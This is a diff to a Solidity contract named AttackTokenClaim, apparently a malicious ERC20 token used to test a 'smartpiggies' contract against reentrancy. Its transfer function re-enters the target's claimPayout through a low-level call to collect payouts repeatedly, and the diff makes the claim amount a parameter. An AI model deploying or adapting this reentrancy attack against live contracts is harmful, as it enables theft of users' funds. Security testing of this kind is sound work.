@@ -361,10 +361,9 @@ contract ERC20 is IERC20 {
 contract AttackTokenClaim is ERC20 {
   uint256 public count;
   uint256 public tokenId;
+  uint256 public claimAmount;
   uint8 public nonce;
-  uint256 public claimAmount = 100;
   address public smartpiggies;
-  uint256 public strike = 10000;
   bool public didSatisfy;
   bool public didRequest;
   bool public didAttack;
@@ -405,34 +404,29 @@ contract AttackTokenClaim is ERC20 {
   }
   function transfer(address recipient, uint256 amount) public returns (bool) {
     xfer = true;
-    attack();
+    attack(claimAmount);
     _transfer(msg.sender, recipient, amount);
     return true;
   }
 
   function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
-    xfer = true;
-    attack();
+    //xfer = true;
+    //attack(claimAmount);
     _transfer(sender, recipient, amount);
     // remove allowance check
     return true;
   }
 
-  function attack()
+  function attack(uint256 _claimAmount)
     public
   {
+    claimAmount = _claimAmount;
     if (count++ < 2) {
-      bytes memory payload = abi.encodeWithSignature("claimPayout(address,uint256)",address(this),claimAmount);
+      bytes memory payload = abi.encodeWithSignature("claimPayout(address,uint256)",address(this),_claimAmount);
       (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);
       attackReturn = string(data);
       didAttack = success;
     }
-  }
-
-  function setAmount(uint256 _amount)
-    public
-  {
-      claimAmount = _amount;
   }
 
   function setTokenId(uint256 _id)
@@ -445,6 +439,12 @@ contract AttackTokenClaim is ERC20 {
     public
   {
       smartpiggies = _smartpiggies;
+  }
+
+  function setAmount(uint256 _amount)
+    public
+  {
+    claimAmount = _amount;
   }
 
   function resetCount() public returns (bool)
